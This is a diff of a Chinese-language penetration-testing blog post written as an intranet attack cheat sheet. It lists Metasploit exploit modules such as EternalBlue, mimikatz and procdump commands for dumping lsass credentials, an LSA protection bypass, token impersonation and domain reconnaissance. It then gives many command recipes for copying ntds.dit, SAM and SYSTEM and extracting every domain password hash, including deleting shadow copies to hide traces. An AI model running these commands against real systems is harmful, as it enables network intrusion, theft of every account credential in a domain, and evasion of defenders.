@@ -88,12 +88,17 @@
 
 <h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure>
 
+
+
+
+
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来就是提权的操作，之前有一篇文章有些过，这里就不在写了</p>
 <h2 id="管理员权限之后"><a href="#管理员权限之后" class="headerlink" title="管理员权限之后"></a>管理员权限之后</h2><h3 id="获取密码-hsahdump"><a href="#获取密码-hsahdump" class="headerlink" title="获取密码 hsahdump"></a>获取密码 hsahdump</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gentilkiwi/mimikatz/releases</span><br><span class="line">https://download.sysinternals.com/files/Procdump.zip</span><br><span class="line"></span><br><span class="line">可以帮他远程下载下来</span><br><span class="line">privilege::debug   提取权限</span><br><span class="line">sekurlsa::logonpasswords   抓取密码</span><br><span class="line"></span><br><span class="line">mimikatz是从 lsass.exe进程中获取windows的账号及密码的，</span><br><span class="line">这时，我们可以帮对方安装一个procdump64.exe（这是微软自己的工具，可以放心使用）</span><br><span class="line"></span><br><span class="line">然后从 lsass.exe进程里导出一个 包含账号密码信息的lsass.dmp 文件，再把这个dmp文件传回来，最后在自己的环境下运行mimikatz，从 dmp文件里读取信息。</span><br><span class="line"></span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot;</span><br><span class="line">&quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line">直接cs交互里面读就行</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">&quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line">直接cs交互里面读就行</span><br><span class="line">hashdump: post/windows/gather/smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --sam / --lsa / --ntds</span><br></pre></td></tr></table></figure>
 
 <h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过<strong>LSA防护策略</strong>读取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot;</span><br><span class="line">&quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect</span><br><span class="line">/process:lsass.exe&quot; &quot;!-&quot; </span><br><span class="line">#with mimidriver.sys 得带上这个才行，看得带上这个才行</span><br></pre></td></tr></table></figure>
 
-<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a><strong>token</strong>窃取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a><strong>token</strong>窃取</h3><p>详情见另一个文章</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -102,6 +107,164 @@
 <h3 id="寻找主域"><a href="#寻找主域" class="headerlink" title="寻找主域"></a>寻找主域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">一般时间服务器 或者dns服务器都是在主域上</span><br><span class="line">你可以直接nslookup 或者 ping DNS服务器可能直接得到域控的ip</span><br><span class="line"></span><br><span class="line">net time /domain</span><br><span class="line">nltest /dsgetdc:域名称</span><br><span class="line">net group &quot;Domain Controllers&quot; /Domain </span><br><span class="line"></span><br><span class="line">两条命令能执行就直接定位，不行的话 没办法喽，换一台试试</span><br><span class="line"></span><br><span class="line">查看域控机器的机器名子</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h3 id="查找域内用户"><a href="#查找域内用户" class="headerlink" title="查找域内用户"></a>查找域内用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查询域内所有用户组列表</span><br><span class="line">查看域内所有用户组</span><br><span class="line">net group /domain</span><br><span class="line">net group &quot;domain users&quot; /domain</span><br><span class="line">net user /domain //短版域内用户列表，但是需要 rpc 开启</span><br><span class="line">net group &quot;domain admins&quot; /domain //域内管理员用户列表</span><br><span class="line">net group &quot;domain computers&quot; /domain // 查看域中所有机器</span><br><span class="line"></span><br><span class="line">获取指定域用户的详细信息</span><br><span class="line">net user 用户名称 /domain</span><br><span class="line"></span><br><span class="line">查看域中的密码策略</span><br><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看本地存储的所有密码"><a href="#查看本地存储的所有密码" class="headerlink" title="查看本地存储的所有密码"></a>查看本地存储的所有密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure>
+
+<p><strong>卷影拷贝（获取域控所有</strong>hash）</p>
+<h1 id="CVE-2020-1472的分析与复现"><a href="#CVE-2020-1472的分析与复现" class="headerlink" title="CVE-2020-1472的分析与复现"></a>CVE-2020-1472的分析与复现</h1><h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2><p>Netlogon远程协议（也称为MS-NRPC）是一个WIndows域控上使用的远程进程调用（RPC）接口，仅由连接到域的设备使用。 MS-NRPC包括身份验证方法和建立Netlogon安全通道的方法。这些更新强制指定的Netlogon客户端行为，以便在成员计算机和Active Directory (AD)域控制器(DC)之间使用带有Netlogon安全通道的安全RPC。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。</p>
+<p>ZeroLogon (CVE-2020-1472) 影响域内登录认证协议Netlogon (MS-NRPC) 中所使用的加密身份验证方案 (AES-CFB8)，在通过NetLogon协议与AD域控建立安全通道（RPC）时，强行登录尝试，对全零的纯文本应用AES-CFB8加密将导致全零的密文，从而可以绕过正常认证，进一步可获取域管理员HASH，获取域管权限 。</p>
+<h2 id="ntds-dit"><a href="#ntds-dit" class="headerlink" title="ntds.dit"></a>ntds.dit</h2><p>Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 <code>%SystemRoot%\ntds\ntds.dit</code>，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
+<p>而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。这也是使用mimikatz经常需要导出的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">system文件位置:C:\Windows\System32\config\SYSTEM</span><br><span class="line">sam文件位置:C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+
+<h4 id="mimikatz-dcsync"><a href="#mimikatz-dcsync" class="headerlink" title="mimikatz-dcsync"></a>mimikatz-dcsync</h4><p>前提:高权限</p>
+<p>Mimikatz有一个功能（dcsync），它可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.mimikatz lsadump::dcsync /domain:redteam.com /all /csv  		//可以通过dcsync直接获取test域内所有用户hash</span><br><span class="line">2.mimikatz lsadump::dcsync /domain:redteam.com /user:admin		//获取单个用户的详细信息</span><br><span class="line">3.mimikatz lsadump::lsa /inject									//查看所有用户的所有详细信息</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="vssadmin卷影拷贝"><a href="#vssadmin卷影拷贝" class="headerlink" title="vssadmin卷影拷贝"></a>vssadmin卷影拷贝</h4><p>vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
+<p>适用机器：Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
+<p>参考链接: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/vssadmin">vssadmin | Microsoft Docs</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.vssadmin create shadow /for=C:								//创建c盘卷影拷贝</span><br><span class="line">2.copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit		//在创建的卷影拷贝中将ntds.dit复制到C盘</span><br><span class="line">3.vssadmin delete shadows /for=c: /quiet						//删除</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">复制sam或者system文件：</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hiv</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hiv</span><br></pre></td></tr></table></figure>
+
+<h3 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a>卷影拷贝（获取域控所有hash）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diskshadow list shadows all</span><br><span class="line">mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><br><span class="line">管理员权限执行</span><br><span class="line">vssadmin create shadow /for=C:</span><br><span class="line">利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive</span><br><span class="line">copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava</span><br><span class="line">hklm\system system.hive</span><br><span class="line">//导出system.hive文件到注册表</span><br><span class="line">vssadmin delete shadows /for=C: /quiet //删除卷影，隐藏痕迹</span><br></pre></td></tr></table></figure>
+
+<h4 id="ntdsutil-exe"><a href="#ntdsutil-exe" class="headerlink" title="ntdsutil.exe"></a>ntdsutil.exe</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。使⽤ ntdsutil.exe，可以维护和管理活动⽬录数据库、控制单个主机操作、创建应⽤程序⽬录分区、删除由未使⽤活动⽬录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit   //首先建立快照，该快照包含Windows中的所有文件，且在复制时不会受到Windows锁定机制的影响</span><br></pre></td></tr></table></figure>
+
+<p>创建了一个快照</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;ID&#125;&quot; quit quit	  		//加载刚刚的快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; quit quit	</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202111120118_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line">#将快照中的ntds.dit拷贝到c盘 ($SNAP_202111120118_VOLUMEC$ 生成快照文件名字)</span><br><span class="line"></span><br><span class="line">ntdsutil snapshot &quot;mount &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; &quot;delete &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; quit quit</span><br><span class="line">//删除刚才创建的快照</span><br></pre></td></tr></table></figure>
+
+
+
+<p>除了利用上面那种操作来获取ntds.dit外，还可以利用Ntdsutil.exe创建媒体安装集(IFM)来用于提取NTDS.dit文件。<strong>在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。</strong></p>
+<p>Ntdsutil是本地处理 Active Directory 的命令实用程序，并为DCPromo启用IFM集创建。IFM与DCPromo一起用于“从媒体安装”，因此被升级的服务器不需要通过网络从另一个DC复制域数据。</p>
+<p>当创建一个IFM时，VSS快照会被自动拍摄，挂载，NTDS.DIT文件和相关数据被复制到目标文件夹中。</p>
+<p>在域控制器中执行如下命令即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit		//生成文件</span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\ntdsutil&quot; q q			//简洁版 </span><br></pre></td></tr></table></figure>
+
+<h5 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h5><p>Nishang中的Copy-VSS.ps1脚本可以用于自动提取——NTDS.DIT，SAM和SYSTEM这些必要文件。这些文件将被解压到当前工作目录或其他任意的指定文件夹中。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</a></p>
+<p>也可以将SAM、SYSTEM、Ntds.dit文件复制到指定的目录中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy-VSS -DestinationDir C:\</span><br></pre></td></tr></table></figure>
+
+<h5 id="我们还可以利用PowerSploit中的Invoke-NinjaCopy脚本"><a href="#我们还可以利用PowerSploit中的Invoke-NinjaCopy脚本" class="headerlink" title="我们还可以利用PowerSploit中的Invoke-NinjaCopy脚本"></a>我们还可以利用PowerSploit中的Invoke-NinjaCopy脚本</h5><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p>
+<p>该脚本用于“万能复制”，像windows主机里SAM文件、域控中的Ntds.dit，里面数据很多有价值的信息，普通的COPY命令是无法复制的，使用万能复制可以复制这类文件。该脚本使用如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用该脚本复制Ntds.dit和SYSTEM文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;C:\system.hive&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036(卷影拷贝服务进入运行状态的标志)。</strong></p>
+<p>导出ntds.dit后，还需要导出SYSTEM，将system.hive转储，因为system.hive中存放着ntds.dit的密钥。</p>
+<p>我们可以用上面讲的Copy-VSS.ps1等方法导出SYSTEM文件，也可以执行如下命令，将导出system</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用工具导出Ntds-dit文件中的散列值"><a href="#利用工具导出Ntds-dit文件中的散列值" class="headerlink" title="利用工具导出Ntds.dit文件中的散列值"></a>利用工具导出Ntds.dit文件中的散列值</h4><p>到现在为止，我们已经学会了利用各种方法将Ntds.dit文件提取出，当我们获得了域控上的Ntds.dit文件后，接下来要做的就是想办法从Ntds.dit文件中导出其中的密码哈希散列值。</p>
+<p>首先我们需要从NTDS.dit文件中提取用户表格，这里我们要通过libesedb-tools中的<strong>esedbexport</strong>来帮我们完成。Libesedb是一个用于访问可扩展存储引擎（ESE）数据库文件（EDB）格式的库。当前，ESE数据库格式被应用于许多不同的应用程序上，如Windows Search，Windows Mail，Exchange，Active Directory（NTDS.dit）等。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/libyal/libesedb/releases">https://github.com/libyal/libesedb/releases</a></p>
+<h5 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h5><p>命令是这个，我下载有一堆报错</p>
+<p>好像直接sudo apt install libesedb-utils   就能安装成功</p>
+<p>安装完成后，进入存放ntds.dit的目录，执行以下命令恢复ntds.dit并提取表信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit        // 提取表信息</span><br></pre></td></tr></table></figure>
+
+<p>提取表成功，并且会在当前目录下生成一个“ntds.dit.export”文件夹：</p>
+<p>ntds.dit中的表一旦被提取出来，有很多python工具可以将这些表中的信息进一步提取从而导出其中的域散列值，比如ntdsxtract就可以完美进行。该工具不仅能够提取与用户对象、组对象、计算机对象相关的信息，同时还能从NTDS.dit文件中删除对象。</p>
+<p>这个然后还要用 ntdsxtract 我没安装成，不弄了气死了</p>
+<h5 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h5><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a href="https://link.zhihu.com/?target=https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx -d ntds.dit -s system -o domain.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h5><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p>
+<p>Invoke-DCSync.ps1 下载地址：<a href="https://link.zhihu.com/?target=https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>
+
+<h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 &#x2F;root&#x2F;.msf4&#x2F;loot&#x2F; 目录下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line">set rhosts 192.168.7.7</span><br><span class="line">set smbdomain teamssix.com</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 1qaz@WSX</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use windows/gather/credentials/domain_hashdump</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p>
+</blockquote>
+<h5 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h5><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p>
+<p>DSInternals 下载地址：<a href="https://link.zhihu.com/?target=https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p>
+<p>安装 DSInternals</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Module DSInternals -Force</span><br></pre></td></tr></table></figure>
+
+<p>直接导出 hash，并保存在 output_hash.txt 文件里</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\system&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\ntds.dit&#x27; -Bootkey $key | Out-File output_hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\system.hive&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\ntds.dit&#x27; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p>
+<p>支持系统：</p>
+<ul>
+<li>Windows Server 2012 R2</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows 10 64-bit</li>
+<li>Windows 8.1 64-bit</li>
+<li>Windows 7 64-bit</li>
+</ul>
+<p>安装与配置方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PowerShell 5.0：</span><br><span class="line">Install-Module DSInternals</span><br><span class="line">或</span><br><span class="line">Install-Module -Name DSInternals -RequiredVersion 3.2.1</span><br><span class="line"></span><br><span class="line">PowerShell 3.0、4.0：</span><br><span class="line">解压压缩包 </span><br><span class="line">cd C:\DSInternals</span><br><span class="line">Import-Module .\DSInternals</span><br></pre></td></tr></table></figure>
+
+<p>详情参考：<a target="_blank" rel="noopener" href="https://www.powershellgallery.com/packages/dsinternals/3.2.1">https://www.powershellgallery.com/packages/dsinternals/3.2.1</a></p>
+<p>要使用DSInternals模块提取用户哈希值，我们需要先获取Ntds.dit、SYSTEM这两个文件。将Ntds.dit、SYSTEM这两个文件导出并拖到我们本地后，即可执行如下命令获取所有账户哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module DSInternals       // 导入DSInternals模块// 获取所有账户信息：</span><br><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\目录\system.hive&#x27;    </span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\目录\ntds.dit&#x27; -Bootkey $key</span><br></pre></td></tr></table></figure>
+
+<p>还可以导出支持Hashcat格式的哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key = Get-Bootkey -SystemHivePath &#x27;C:\目录\system.hive&#x27;</span><br><span class="line"></span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\目录\ntds.dit&#x27; -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h5><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p>
